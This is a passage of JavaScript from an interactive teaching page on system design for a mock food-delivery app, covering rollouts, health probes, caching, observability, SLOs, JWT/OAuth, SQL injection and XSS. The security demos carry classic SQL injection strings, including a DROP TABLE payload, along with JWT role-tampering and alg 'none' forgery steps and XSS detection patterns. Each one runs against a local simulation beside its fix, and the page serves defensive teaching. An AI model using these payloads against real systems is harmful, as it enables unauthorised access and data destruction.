    out.replaceChildren(...(errs.length?errs.map(e=>h('div',{class:'step bad'},h('span',{class:'dot'},'✗'),h('div',null,e))):[h('div',{class:'step ok'},h('span',{class:'dot'},'✓'),h('div',null,'Every field passed. The server now looks up prices itself and computes the total.'))]));
    v.textContent=errs.length?'422 UNPROCESSABLE · '+errs.length+' problem'+(errs.length>1?'s':''):'201 ACCEPTED';v.className='bigstate '+(errs.length?'bad':'good');
  };
  const load=k=>{ta.value=JSON.stringify(P[k],null,2);run()};
  ta.addEventListener('input',run);
  body.append(
    h('div',{class:'ctrls'},btn('Valid order',()=>load('good')),btn('Negative quantity',()=>load('qty')),btn('Client sets the price',()=>load('price')),btn('Sneaks in isAdmin',()=>load('admin')),btn('300-character address',()=>load('long'))),
    ta,v,out);
  load('good');
});

/* ===== C · deployments & reliability ===== */

card('ops','flags','Feature flags and gradual rollout',['Feature Flags'],
'The new checkout screen ships dark. A flag decides who sees it, so you can widen the audience slowly, or switch it off in seconds without a deploy.',
body=>{
  let pct=20,target='all';
  const CITY=['Hyderabad','Bengaluru','Mumbai','Delhi'];
  const users=Array.from({length:60},(_,i)=>({id:'u'+(i+1),city:CITY[hash32(i+11)%4],beta:hash32(i*7+3)%6===0}));
  const grid=h('div',{class:'cells big'}),sN=stat('Seeing the new checkout','–'),pre=h('pre',{class:'code'}),R=receipt();
  const on=u=>{
    if(target==='beta'&&!u.beta)return false;
    if(target==='hyd'&&u.city!=='Hyderabad')return false;
    return hash32(hashStr('new_checkout:'+u.id))%100<pct;
  };
  const rng=range('Rollout percentage',0,100,5,pct,v=>{pct=v;paint()},v=>v+'%');
  const paint=()=>{
    const flags=users.map(on);
    grid.replaceChildren(...users.map((u,i)=>h('i',{class:flags[i]?'on':'',title:u.id+' · '+u.city+(u.beta?' · beta tester':'')})));
    sN.set(flags.filter(Boolean).length+' of 60');
    pre.textContent='{\n  "flag": "new_checkout",\n  "enabled": '+(pct>0)+',\n  "rollout_percent": '+pct+',\n  "audience": "'+(target==='all'?'everyone':target==='beta'?'beta testers only':'city = Hyderabad')+'"\n}';
  };
  body.append(
    h('div',{class:'ctrls'},seg([['all','Everyone'],['beta','Beta testers only'],['hyd','Hyderabad only']],target,v=>{target=v;paint()}),btn('Kill switch',()=>{pct=0;rng.set(0);R.add('Kill switch pulled. Everyone is back on the old checkout, no deploy needed.','err');paint()},'bad')),
    rng,grid,h('div',{class:'stats'},sN),pre,R.el,
    h('div',{class:'sm dim'},'Each user is hashed into a stable bucket, so raising 20% to 40% keeps the first 20% on the new screen instead of reshuffling everyone.'));
  paint();
});

card('ops','deploy','Rolling, blue-green and canary releases',['Rolling Deployments','Blue-Green Deployment','Canary Releases'],
'Version 2 is going out to ten instances. The strategy decides how many customers are exposed if v2 has a bug.',
body=>{
  let strat='canary',bug=true,auto=true,busy=false;
  const fleet=h('div',{class:'cells big'}),R=receipt(),tr=barRow('Traffic on v2'),sF=stat('Failed requests',0,'good');
  const PLAN={
    rolling:[2,4,6,8,10].map(n=>({inst:n,t:n/10,txt:'replaced '+n+' of 10 instances, '+n*10+'% of traffic on v2'})),
    bluegreen:[{inst:0,t:0,txt:'green fleet of 10 × v2 started beside blue, no traffic yet'},{inst:0,t:0,txt:'smoke test against green passed'},{inst:10,t:1,txt:'router flipped: 100% of traffic now on green'}],
    canary:[1,3,5,10].map((n,i)=>({inst:n,t:[.05,.25,.5,1][i],txt:'canary at '+[5,25,50,100][i]+'% of traffic'}))
  };
  const paint=(inst,t)=>{
    fleet.replaceChildren(...Array.from({length:10},(_,i)=>h('i',{class:i<inst?'on':'',title:i<inst?'v2':'v1'})));
    tr.set(t*100,Math.round(t*100)+'%','var(--info)');
  };
  const run=async()=>{
    if(busy)return;busy=true;R.clear();let failed=0;sF.set(0,'good');paint(0,0);
    R.add('Deploying v2 with the '+({rolling:'rolling',bluegreen:'blue-green',canary:'canary'})[strat]+' strategy'+(bug?' (v2 returns errors on half its requests)':''),'dim');
    for(const s of PLAN[strat]){
      await sleep(750);paint(s.inst,s.t);R.add(s.txt,'dim');
      if(bug&&s.t>0){
        const f=Math.round(1000*s.t*.5);failed+=f;sF.set(failed,'bad');
        R.add('  '+f+' of '+Math.round(1000*s.t)+' requests failed on v2 ('+Math.round(s.t*50)+'% error rate)','err');
        if(auto&&s.t*.5>.02){await sleep(600);R.add('error rate is above 2%, rolling back to v1','warn');paint(0,0);R.add('Rolled back. '+failed+' requests failed in total.','err');busy=false;return}
      }
    }
    R.add(bug?'v2 is fully live and still broken. Nothing stopped it.':'v2 is fully live. No errors.',bug?'err':'ok');busy=false;
  };
  body.append(
    h('div',{class:'ctrls'},seg([['rolling','Rolling'],['bluegreen','Blue-green'],['canary','Canary']],strat,v=>{strat=v}),btn('Deploy v2',run,'pri')),
    h('div',{class:'ctrls'},toggle('v2 has a bug',true,v=>{bug=v}),toggle('Auto-rollback when errors exceed 2%',true,v=>{auto=v})),
    h('div',{class:'sm dim'},'Instances: dark is v1, accent is v2'),fleet,h('div',{class:'bars'},tr),h('div',{class:'stats'},sF),R.el);
  paint(0,0);R.add('Try the same bug with each strategy and compare the failed requests.','dim');
});

card('ops','probes','Health checks, liveness and readiness probes',['Health Checks','Liveness & Readiness Probes'],
'Kubernetes asks each pod two questions. Liveness: are you stuck, should I restart you? Readiness: can you take traffic right now, or should the load balancer skip you?',
body=>{
  let readyOn=true,err=0,tot=0;
  const P=[1,2,3].map(i=>({n:'orders-api-'+i,fault:'none',lf:0,restart:0,warm:0,live:true,ready:true,served:0}));
  const R=receipt(),sE=stat('Failed requests',0,'good');
  P.forEach(p=>{p.st=h('div',{class:'sm'},'');p.pr=h('div',{class:'sm mono'},'');p.el=h('div',{class:'node'},h('b',null,p.n),p.st,p.pr)});
  const paint=()=>P.forEach(p=>{
    const state=p.restart>0?'Restarting':p.ready?'Ready, in rotation':'Not ready, skipped by the load balancer';
    p.st.textContent=state;
    p.pr.textContent='liveness '+(p.live?'ok':'FAIL '+p.lf+'/3')+' · readiness '+(p.ready?'ok':'FAIL')+' · served '+p.served;
    p.el.className='node '+(p.restart>0?'warn':p.ready?'ok':(p.live?'warn':'bad'));
  });
  const tick=()=>{
    P.forEach(p=>{
      if(p.restart>0){p.restart--;p.live=false;p.ready=false;if(p.restart===0){p.fault='none';p.live=true;p.ready=true;R.add(p.n+' restarted and healthy again','ok')}return}
      if(p.fault==='hung'){p.live=false;p.ready=false;p.lf++;if(p.lf>=3){p.restart=3;p.lf=0;R.add(p.n+': liveness failed 3 times in a row → kubelet restarts the container','err')}}
      else if(p.fault==='db'){p.live=true;p.ready=false;p.lf=0}
      else if(p.fault==='warm'){p.live=true;p.lf=0;p.ready=p.warm<=0;p.warm--;if(p.warm<-1){p.fault='none';R.add(p.n+' finished warming up, readiness passes','ok')}}
      else{p.live=true;p.ready=true;p.lf=0}
    });
    const pool=readyOn?P.filter(p=>p.ready):P;
    for(let i=0;i<6;i++){tot++;if(!pool.length){err++;continue}const p=pool[i%pool.length];if(p.ready)p.served++;else err++}
    sE.set(err,err?'bad':'good');paint();
  };
  const hit=(i,f,msg)=>{P[i].fault=f;P[i].lf=0;if(f==='warm')P[i].warm=8;R.add(msg,'warn')};
  body.append(
    h('div',{class:'ctrls'},btn('Hang pod 1 (deadlock)',()=>hit(0,'hung','orders-api-1 is stuck. Both probes time out.'),'bad'),btn('Pod 2 loses its database',()=>hit(1,'db','orders-api-2 cannot reach Postgres. Alive, but not ready.'),'bad'),btn('Cold start on pod 3',()=>hit(2,'warm','orders-api-3 is loading caches (about 6 s).'),'bad'),btn('Heal DB link',()=>{P.forEach(p=>{if(p.fault==='db')p.fault='none'});R.add('database link restored','ok')})),
    toggle('Readiness probe enabled (the load balancer skips unready pods)',true,v=>{readyOn=v;R.add(v?'Traffic now only goes to ready pods.':'Readiness ignored: traffic goes to every pod, ready or not.','dim')}),
    h('div',{class:'nodes'},P.map(p=>p.el)),h('div',{class:'stats'},sE),R.el);
  paint();R.add('6 requests arrive every tick. Break a pod and watch which probe reacts.','dim');
  live(body,600,tick);
});

card('ops','invalidate','Cache invalidation',['Cache Invalidation'],
'The owner changes the price of Butter Chicken. How soon do customers see it? Every strategy has a catch, and delete-on-write has a famous race.',
body=>{
  let strat='ttl',ttl=10,db=320,cache=null,busy=false;
  const R=receipt(),dbT=h('div',{class:'mono'},''),chT=h('div',{class:'mono'},''),seeT=h('div',{class:'bigstate'},'');
  const dbN=h('div',{class:'node'},h('b',null,'Database'),dbT),chN=h('div',{class:'node'},h('b',null,'Cache'),chT);
  const paint=()=>{
    dbT.textContent='price = '+inr(db);
    const left=cache?Math.max(0,(cache.exp-Date.now())/1000):0;
    chT.textContent=cache?'price = '+inr(cache.v)+' · expires in '+left.toFixed(1)+' s':'empty';
    chN.className='node '+(cache&&cache.v!==db?'bad':cache?'ok':'dim');
  };
  const open=()=>{
    if(cache&&cache.exp>Date.now()){const stale=cache.v!==db;R.add('menu → cache HIT: customer sees '+inr(cache.v)+(stale?'   ← STALE (database says '+inr(db)+')':''),stale?'err':'ok');seeT.textContent=inr(cache.v)+(stale?' · stale':' · fresh');seeT.className='bigstate '+(stale?'bad':'good')}
    else{cache={v:db,exp:Date.now()+ttl*1000};R.add('menu → MISS, read the database, cached '+inr(db),'dim');seeT.textContent=inr(db)+' · fresh';seeT.className='bigstate good'}
    paint();
  };
  const change=()=>{
    db=db===320?349:320;
    if(strat==='ttl')R.add('price changed to '+inr(db)+'. Nothing touches the cache, so it stays old until the TTL runs out.','warn');
    else if(strat==='purge'){cache=null;R.add('price changed to '+inr(db)+' and the cache entry was deleted. The next read repopulates it.','ok')}
    else{cache={v:db,exp:Date.now()+ttl*1000};R.add('price changed to '+inr(db)+' and written to the cache in the same step.','ok')}
    paint();
  };
  const race=async()=>{
    if(busy)return;busy=true;cache=null;db=320;paint();R.add('— replaying the race (delete-on-write) —','dim');
    const steps=[['Reader','GET menu → MISS, starts reading the database: price '+inr(320)+' (slow query)',''],['Writer','UPDATE price = '+inr(349),'ok'],['Writer','DEL menu (cache is empty anyway)','ok'],['Reader','finally finishes, SET menu = '+inr(320),'err']];
    for(let i=0;i<steps.length;i++){R.add(steps[i][0].padEnd(7)+' '+steps[i][1],steps[i][2]);await sleep(600);if(i===1)db=349;if(i===3)cache={v:320,exp:Date.now()+ttl*1000};paint()}
    R.add('The cache now holds '+inr(320)+' while the database holds '+inr(349)+'. A TTL is the only thing that eventually fixes it.','err');busy=false;
  };
  body.append(
    h('div',{class:'ctrls'},seg([['ttl','TTL only'],['purge','Delete on write'],['through','Write-through']],strat,v=>{strat=v;R.add('strategy: '+({ttl:'wait for expiry',purge:'delete the key when data changes',through:'update the cache together with the database'})[v],'dim')}),range('TTL',3,30,1,ttl,v=>{ttl=v},v=>v+' s')),
    h('div',{class:'ctrls'},btn('Customer opens the menu',open,'pri'),btn('Owner changes the price',change),btn('Replay the delete-on-write race',race,'bad')),
    h('div',{class:'nodes'},dbN,chN),seeT,R.el);
  paint();
  live(body,250,()=>{if(cache&&cache.exp<=Date.now()){cache=null}paint()});
});

card('ops','observe','Metrics, logs and traces',['Monitoring','Logging','Distributed Tracing','Observability'],
'Three views of the same checkout. Metrics say something is wrong, traces show which service is slow, logs explain why. A shared trace id ties them together.',
body=>{
  let slow=false,failing=false,auto=true,sel=null,filter=null,hold=false,dirty=true;
  const reqs=[],logs=[],series={p95:[],err:[],rps:[]};
  const tiles={};
  [['p95','p95 latency'],['err','Error rate'],['rps','Requests per second']].forEach(([k,l])=>{tiles[k]={v:h('b',null,'–'),g:h('div',{class:'sparkbox'}),el:null};tiles[k].el=h('div',{class:'stat'},h('small',null,l),tiles[k].v,tiles[k].g)});
  const list=h('div',{class:'reqlist'}),wf=h('div',{class:'waterfall'}),logEl=h('div',{class:'receipt tall'}),fnote=h('div',{class:'sm dim'},'');
  const gen=()=>{
    const trace=hex(6),inv=ri(18,40),pay=slow?ri(900,1400):ri(90,140),err=failing&&Math.random()<.6;
    const total=8+inv+2+pay+6+4;
    const spans=[{svc:'gateway',n:'POST /orders',t0:0,d:total},{svc:'orders-api',n:'create order',t0:3,d:total-6},{svc:'postgres',n:'check stock',t0:8,d:inv},{svc:'payments',n:'charge via Stripe',t0:8+inv+2,d:pay,err},{svc:'queue',n:'publish OrderPlaced',t0:8+inv+2+pay,d:6}];
    const ts=new Date().toLocaleTimeString('en-GB');
    const L=(level,svc,msg)=>logs.push({ts,level,svc,trace,msg});
    L('info','gateway','request accepted route=/orders user=usr_184');
    L('info','postgres','stock check ok ms='+inv);
    if(err)L('error','payments','stripe returned 503 after '+pay+' ms');
    else if(slow)L('warn','payments','stripe slow ms='+pay);
    else L('info','payments','charge captured ms='+pay);
    while(logs.length>150)logs.shift();
    reqs.push({trace,total,err,spans});if(reqs.length>40)reqs.shift();dirty=true;
  };
  const avgSeries=()=>{
    const last=reqs.slice(-20),lat=last.map(r=>r.total).sort((a,b)=>a-b);
    series.p95.push(lat.length?lat[Math.min(lat.length-1,Math.floor(lat.length*.95))]:0);
    series.err.push(last.length?last.filter(r=>r.err).length/last.length*100:0);
    series.rps.push(auto?1.2:0);
    Object.values(series).forEach(a=>{while(a.length>40)a.shift()});
    const lastv=k=>series[k][series[k].length-1];
    tiles.p95.v.textContent=Math.round(lastv('p95'))+' ms';tiles.err.v.textContent=lastv('err').toFixed(0)+'%';tiles.rps.v.textContent=lastv('rps').toFixed(1);
    tiles.p95.g.innerHTML=sparkSVG(series.p95,1600,'var(--accent)');
    tiles.err.g.innerHTML=sparkSVG(series.err,100,'var(--bad)');
    tiles.rps.g.innerHTML=sparkSVG(series.rps,2,'var(--info)');
  };
  const drawList=()=>{
    list.replaceChildren(...reqs.slice(-7).reverse().map(r=>h('button',{type:'button',class:'req'+(r.trace===sel?' sel':''),'data-t':r.trace},h('span',{class:'mono'},r.trace),h('span',{class:'mono'},Math.round(r.total)+' ms'),pill(r.err?'500':'200',r.err?'bad':'good'))));
  };
  const drawTrace=()=>{
    const r=reqs.find(x=>x.trace===sel)||reqs[reqs.length-1];
    if(!r){wf.textContent='Send an order to record a trace.';return}
    wf.replaceChildren(h('div',{class:'sm dim'},'trace '+r.trace+' · '+Math.round(r.total)+' ms'),...r.spans.map(s=>h('div',{class:'span'},h('span',{class:'sl'},s.svc+' · '+s.n),h('div',{class:'st'},h('i',{class:s.err?'bad':s.d>500?'slow':'',style:'left:'+(s.t0/r.total*100)+'%;width:'+Math.max(1,s.d/r.total*100)+'%'})),h('span',{class:'mono sd'},Math.round(s.d)+' ms'))));
  };
  const drawLogs=()=>{
    const f=filter||null,rows=logs.filter(l=>!f||l.trace===f).slice(-40);
    logEl.replaceChildren(...rows.map(l=>h('div',{class:l.level==='error'?'err':l.level==='warn'?'warn':''},'{"ts":"'+l.ts+'","level":"'+l.level+'","svc":"'+l.svc+'","trace_id":"'+l.trace+'","msg":"'+l.msg+'"}')));
    logEl.scrollTop=logEl.scrollHeight;
    fnote.textContent=f?'Showing only logs for trace '+f+'.':'Showing the latest logs from every service.';
  };
  const refresh=()=>{if(!hold){if(dirty){drawList();dirty=false}}drawTrace();drawLogs();avgSeries()};
  list.addEventListener('click',e=>{const b=e.target.closest('[data-t]');if(!b)return;sel=b.dataset.t;filter=sel;dirty=true;drawList();dirty=false;drawTrace();drawLogs()});
  list.addEventListener('pointerenter',()=>{hold=true});list.addEventListener('pointerleave',()=>{hold=false});
  body.append(
    h('div',{class:'ctrls'},btn('Send an order',()=>{gen();refresh()},'pri'),toggle('Orders arrive on their own',true,v=>{auto=v}),toggle('Payments is slow',false,v=>{slow=v}),toggle('Payments fails sometimes',false,v=>{failing=v})),
    h('div',{class:'stats'},tiles.p95.el,tiles.err.el,tiles.rps.el),
    h('div',{class:'sm dim'},'Recent requests (click one to see its trace and logs)'),list,wf,
    h('div',{class:'ctrls'},h('div',{class:'sm dim grow'},'Structured logs'),btn('Show all logs',()=>{filter=null;drawLogs()})),logEl,fnote);
  for(let i=0;i<6;i++)gen();refresh();
  live(body,900,()=>{if(auto)gen();refresh()});
});

card('ops','slo','SLOs, error budgets and alerts',['SLOs','Error Budgets','Alerts'],
'An SLO is a promise, like 99.9% of checkouts succeed. The error budget is how much failure that promise allows. Alerts fire on how fast you are burning it.',
body=>{
  const MONTH=43200;let slo=99.9,used=0;
  const bud=()=>MONTH*(1-slo/100);
  const m=meter(),txt=h('div',{class:'mono'},''),R=receipt(),sB=stat('Budget for 30 days','–'),sL=stat('Left','–');
  const fmt=x=>x>=60?(x/60).toFixed(1)+' h':x.toFixed(1)+' min';
  const paint=()=>{
    const b=bud(),left=Math.max(0,b-used),p=used/b*100;
    m.set(p,p>=100?'var(--bad)':p>75?'var(--warn)':'var(--good)');
    txt.textContent=used.toFixed(1)+' of '+b.toFixed(1)+' minutes of downtime used ('+Math.min(100,p).toFixed(0)+'%)';
    sB.set(fmt(b));sL.set(fmt(left),p>=100?'bad':p>75?'warn':'good');
  };
  const incident=(label,minutes,errRate)=>{
    const b=bud(),burn=errRate/(1-slo/100);
    used+=minutes;R.add('Incident: '+label+' → used '+minutes.toFixed(1)+' min of budget','dim');
    if(burn>=14.4)R.add('PAGE on-call: fast burn, '+burn.toFixed(0)+'× the sustainable rate. At this pace the whole month is gone in '+(720/burn).toFixed(1)+' hours.','err');
    else if(burn>=1)R.add('TICKET: slow burn, '+burn.toFixed(1)+'× the sustainable rate. Not an emergency yet, but the month will not last.','warn');
    if(used>=b)R.add('BUDGET EXHAUSTED: freeze feature releases, work only on reliability until the window recovers.','err');
    else if(used/b>.75)R.add('WARNING: under 25% of the budget is left. Hold risky deploys.','warn');
    paint();
  };
  body.append(
    h('div',{class:'ctrls'},seg([['99','99%'],['99.9','99.9%'],['99.99','99.99%']],String(slo),v=>{slo=parseFloat(v);R.add('SLO set to '+v+'%. Budget is now '+bud().toFixed(1)+' minutes a month.','dim');paint()})),
    h('div',{class:'ctrls'},btn('5 minute full outage',()=>incident('5 minutes of total failure',5,1),'bad'),btn('30 minute full outage',()=>incident('30 minutes of total failure',30,1),'bad'),btn('2 hours at 2% errors',()=>incident('2 hours of 2% failed checkouts',2.4,.02),'bad'),btn('Start a new month',()=>{used=0;R.clear();R.add('Budget reset for a new 30-day window.','dim');paint()})),
    m,txt,h('div',{class:'stats'},sB,sL),R.el);
  paint();R.add('Each extra nine cuts the allowed downtime tenfold. Try the same outage at each SLO.','dim');
});

/* ===== D · security ===== */

const b64u=s=>btoa(unescape(encodeURIComponent(s))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
const b64uBytes=u8=>btoa(String.fromCharCode(...u8)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
const unb64u=s=>{s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';return decodeURIComponent(escape(atob(s)))};
async function hmacSign(secret,msg){
  try{
    const enc=new TextEncoder(),k=await crypto.subtle.importKey('raw',enc.encode(secret),{name:'HMAC',hash:'SHA-256'},false,['sign']);
    return b64uBytes(new Uint8Array(await crypto.subtle.sign('HMAC',k,enc.encode(msg))));
  }catch(e){return 'demo'+hashStr(secret+'|'+msg).toString(36)}
}

card('sec','jwt','JWT and OAuth 2.0',['JWT/OAuth'],
'A JWT is a signed note the API trusts without calling the database. OAuth lets customers sign in with Google without FoodRush ever seeing their password.',
body=>{
  const SECRET='foodrush-demo-secret';
  let view='jwt',role='customer',expired=false,token=null,attacker=false,step=0,dead=false;
  const R=receipt(),tokEl=h('div',{class:'token mono'},'No token yet. Issue one.'),decEl=h('pre',{class:'code'},'');
  const show=()=>{
    if(!token){tokEl.textContent='No token yet. Issue one.';decEl.textContent='';return}
    tokEl.replaceChildren(h('span',{class:'tk1'},token.hd),'.',h('span',{class:'tk2'},token.pl),'.',h('span',{class:'tk3'},token.sig||'(empty)'));
    let a='?',b='?';
    try{a=JSON.stringify(JSON.parse(unb64u(token.hd)))}catch(e){a='(unreadable)'}
    try{b=JSON.stringify(JSON.parse(unb64u(token.pl)))}catch(e){b='(unreadable)'}
    decEl.textContent='header   '+a+'\npayload  '+b;
  };
  const issue=async()=>{
    const hd=b64u(JSON.stringify({alg:'HS256',typ:'JWT'})),now=Math.floor(Date.now()/1000);
    const pl=b64u(JSON.stringify({sub:'usr_184',role,iat:now,exp:now+(expired?-60:3600)}));
    token={hd,pl,sig:await hmacSign(SECRET,hd+'.'+pl)};show();
    R.add('Auth service signed a token for usr_184, role='+role+(expired?' (already expired)':''),'ok');
  };
  const verify=async()=>{
    if(!token){R.add('No token to send. Issue one first.','warn');return}
    let hdr,p;
    try{hdr=JSON.parse(unb64u(token.hd))}catch(e){R.add('API: 401, header unreadable','err');return}
    if(hdr.alg!=='HS256'){R.add('API: 401. The alg is "'+hdr.alg+'" but this API only accepts HS256. Trusting "none" would let anyone forge a token.','err');return}
    const sig=await hmacSign(SECRET,token.hd+'.'+token.pl);
    if(sig!==token.sig){R.add('API: 401. The signature does not match the header and payload, so the token was altered.','err');return}
    try{p=JSON.parse(unb64u(token.pl))}catch(e){R.add('API: 401, payload unreadable','err');return}
    if(p.exp<Math.floor(Date.now()/1000)){R.add('API: 401. The token expired '+(Math.floor(Date.now()/1000)-p.exp)+' s ago.','err');return}
    R.add('API: 200. Signature valid, not expired, role='+p.role+'. Request allowed.','ok');
  };
  const tamper=async()=>{
    if(!token){R.add('Issue a token first.','warn');return}
    const p=JSON.parse(unb64u(token.pl));p.role='admin';token={...token,pl:b64u(JSON.stringify(p))};show();
    R.add('Attacker edited the payload to role=admin. They cannot re-sign it without the secret.','warn');await verify();
  };
  const algNone=async()=>{
    if(!token){R.add('Issue a token first.','warn');return}
    token={hd:b64u(JSON.stringify({alg:'none',typ:'JWT'})),pl:token.pl,sig:''};show();
    R.add('Attacker set alg to "none" and dropped the signature.','warn');await verify();
  };
  const jwtP=h('div',{class:'panel'},
    h('div',{class:'ctrls'},seg([['customer','Role: customer'],['admin','Role: admin']],role,v=>{role=v}),toggle('Issue it already expired',false,v=>{expired=v}),btn('Issue token',issue,'pri')),
    tokEl,decEl,
    h('div',{class:'ctrls'},btn('Send to API',verify),btn('Tamper: make me admin',tamper,'bad'),btn('Attack: alg none',algNone,'bad')),
    h('div',{class:'sm dim'},'Colors: header, payload, signature. The first two are only encoded, not encrypted, so anyone can read them. Never put secrets in a JWT.'));
  const OS=[
    ['1. Redirect to Google','FoodRush sends the browser to accounts.google.com/authorize with client_id, redirect_uri, scope=openid email, a random state and a PKCE code_challenge.'],
    ['2. Customer consents','Google shows its own sign-in and consent screen. FoodRush never sees the password.'],
    ['3. Redirect back with a code','Google sends the browser to foodrush.in/callback?code=SplxlOBe&state=Xk9. The code is single-use and short-lived.'],
    ['4. Check the state','FoodRush compares state with the value stored in the session. A mismatch means someone injected a forged callback.'],
    ['5. Exchange the code','The backend POSTs the code, the PKCE code_verifier and its client secret to Google’s token endpoint, server to server.'],
    ['6. Receive tokens','Google returns an access token and an ID token. FoodRush verifies them and issues its own session JWT.']
  ];
  const li=OS.map(o=>h('li',{class:'step'},h('span',{class:'dot'},'·'),h('div',null,h('b',null,o[0]),h('div',{class:'sm dim'},'waiting'))));
  const setStep=(i,st,t)=>{li[i].className='step '+st;li[i].firstChild.textContent=({ok:'✓',bad:'✗'})[st]||'·';li[i].lastChild.lastChild.textContent=t};
  const next=()=>{
    if(dead||step>=OS.length)return;
    if(step===3&&attacker){setStep(3,'bad','state is "Xk9" in the session but "ZZZ" in the callback. Flow aborted, the forged login is rejected.');R.add('OAuth: callback rejected, state mismatch (CSRF attempt).','err');dead=true;return}
    setStep(step,'ok',OS[step][1]);if(step===OS.length-1)R.add('OAuth: customer signed in with Google.','ok');step++;
  };
  const resetO=()=>{step=0;dead=false;li.forEach((_,i)=>setStep(i,'','waiting'))};
  const oaP=h('div',{class:'panel'},
    h('div',{class:'ctrls'},btn('Next step',next,'pri'),btn('Start over',resetO),toggle('Attacker swaps the state value',false,v=>{attacker=v})),
    h('ol',{class:'steps'},li));
  oaP.hidden=true;
  body.append(h('div',{class:'ctrls'},seg([['jwt','JWT'],['oauth','OAuth 2.0 sign-in']],view,v=>{view=v;jwtP.hidden=v!=='jwt';oaP.hidden=v!=='oauth'})),jwtP,oaP,R.el);
  show();
});

card('sec','sqli','SQL injection',['SQL Injection'],
'A login form that glues user text into a query lets an attacker rewrite the query. A parameterized query treats the same text as plain data.',
body=>{
  const USERS=[{email:'admin@foodrush.in',pw:'S3cret!admin'},{email:'asha@example.in',pw:'hunter2'}];
  let mode='vuln';
  const uI=h('input',{type:'text',id:uid('i'),class:'inp',value:'asha@example.in','aria-label':'Email',autocomplete:'off',spellcheck:'false'}),pI=h('input',{type:'text',id:uid('i'),class:'inp',value:'hunter2','aria-label':'Password',autocomplete:'off',spellcheck:'false'});
  const sqlEl=h('pre',{class:'code'}),res=h('div',{class:'bigstate'},'');
  const evalVuln=(u,p)=>{
    if(/;\s*drop\s+table\s+\w+/i.test(u+' '+p))return{ok:'bad',msg:'Two statements ran. The second one dropped the orders table. Every order is gone.'};
    if(/'\s*or\s+['"]?(\w+)['"]?\s*=\s*['"]?(\w+)['"]?/i.test(u+' '+p)){
      const m=/'\s*or\s+['"]?(\w+)['"]?\s*=\s*['"]?(\w+)['"]?/i.exec(u+' '+p);
      if(m[1]===m[2])return{ok:'bad',msg:'The WHERE clause is always true, so every row matched. Logged in as the first user: admin@foodrush.in.'};
    }
    const c=/^([^']+)'\s*--/.exec(u);
    if(c){const row=USERS.find(x=>x.email.toLowerCase()===c[1].toLowerCase());return row?{ok:'bad',msg:'Everything after -- was ignored, including the password check. Logged in as '+row.email+' without a password.'}:{ok:'good',msg:'Comment trick used, but no user has that email. 0 rows.'}}
    if((u.split("'").length-1)%2||(p.split("'").length-1)%2)return{ok:'warn',msg:'ERROR: unterminated quoted string. The raw database error leaks to the attacker, confirming the page is injectable.'};
    const row=USERS.find(x=>x.email===u&&x.pw===p);
    return row?{ok:'good',msg:'1 row. Logged in as '+row.email+'.'}:{ok:'good',msg:'0 rows. Invalid credentials.'};
  };
  const run=()=>{
    const u=uI.value,p=pI.value;
    if(mode==='vuln'){
      sqlEl.textContent="query = \"SELECT * FROM users\\n  WHERE email = '\" + email + \"'\\n    AND password = '\" + password + \"'\"\n\nfinal SQL sent to the database:\nSELECT * FROM users\n  WHERE email = '"+u+"'\n    AND password = '"+p+"'";
      const r=evalVuln(u,p);res.textContent=r.msg;res.className='bigstate '+r.ok;
    }else{
      sqlEl.textContent='db.query(\n  "SELECT * FROM users WHERE email = $1 AND password_hash = $2",\n  [email, hash(password)]\n)\n\nparameters travel separately from the SQL:\n$1 = '+JSON.stringify(u)+'\n$2 = '+JSON.stringify('hash('+p+')');
      const row=USERS.find(x=>x.email===u&&x.pw===p);
      res.textContent=row?'1 row. Logged in as '+row.email+'.':'0 rows. The text is just a value that matches nobody, however clever it is.';res.className='bigstate '+(row?'good':'good');
    }
  };
  const P=(label,u,p)=>btn(label,()=>{uI.value=u;pI.value=p;run()});
  uI.addEventListener('input',run);pI.addEventListener('input',run);
  body.append(
    h('div',{class:'ctrls'},seg([['vuln','String concatenation'],['safe','Parameterized query']],mode,v=>{mode=v;run()})),
    h('div',{class:'ctrls'},h('label',{class:'fld',for:uI.id},h('span',null,'Email'),uI),h('label',{class:'fld',for:pI.id},h('span',null,'Password'),pI)),
    h('div',{class:'ctrls'},P('Normal login','asha@example.in','hunter2'),P("' OR '1'='1",'asha@example.in',"' OR '1'='1"),P("admin'--","admin@foodrush.in'--",'x'),P('Drop table',"x'; DROP TABLE orders;--",'x')),
    sqlEl,res);
  run();
});

card('sec','xss','Cross-site scripting (XSS)',['XSS'],
'The AI review analyzer shows customer reviews on the restaurant page. If a review is inserted as HTML, an attacker’s review becomes code running in every visitor’s browser.',
body=>{
  let mode='unsafe';
  const ta=h('textarea',{id:uid('t'),class:'ta',rows:3,spellcheck:'false','aria-label':'Review text'}),srcEl=h('pre',{class:'code'}),seen=h('div',{class:'box'}),res=h('div',{class:'bigstate'},'');
  const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
  const danger=html=>{
    const d=new DOMParser().parseFromString(html,'text/html'),f=[];
    d.querySelectorAll('script').forEach(()=>f.push('a <script> element'));
    d.querySelectorAll('*').forEach(e=>[...e.attributes].forEach(a=>{
      if(/^on/i.test(a.name))f.push('an '+a.name+' handler on <'+e.tagName.toLowerCase()+'>');
      if(/^(href|src)$/i.test(a.name)&&/^\s*javascript:/i.test(a.value))f.push('a javascript: link on <'+e.tagName.toLowerCase()+'>');
    }));
    return{found:f,text:d.body.textContent};
  };
  const run=()=>{
    const raw=ta.value;
    if(mode==='safe'){
      srcEl.textContent='<p class="review">'+esc(raw)+'</p>';
      seen.textContent=raw;res.textContent='SAFE: shown as plain text';res.className='bigstate good';return;
    }
    srcEl.textContent='<p class="review">'+raw+'</p>';
    const d=danger('<p class="review">'+raw+'</p>');
    seen.textContent=d.text||'(nothing visible)';
    if(!d.found.length){res.textContent='HARMLESS: no executable content';res.className='bigstate good';return}
    if(mode==='csp'){res.textContent='BLOCKED BY CSP: '+d.found[0]+' refused to run. Still fix the escaping.';res.className='bigstate warn';return}
    res.textContent='EXECUTES in the visitor’s browser: '+d.found.join(', ')+'. It can read their session and act as them.';res.className='bigstate bad';
  };
  const P=(label,t)=>btn(label,()=>{ta.value=t;run()});
  ta.addEventListener('input',run);
  body.append(
    h('div',{class:'ctrls'},seg([['unsafe','Insert as HTML (innerHTML)'],['safe','Escape or textContent'],['csp','HTML + CSP header']],mode,v=>{mode=v;run()})),
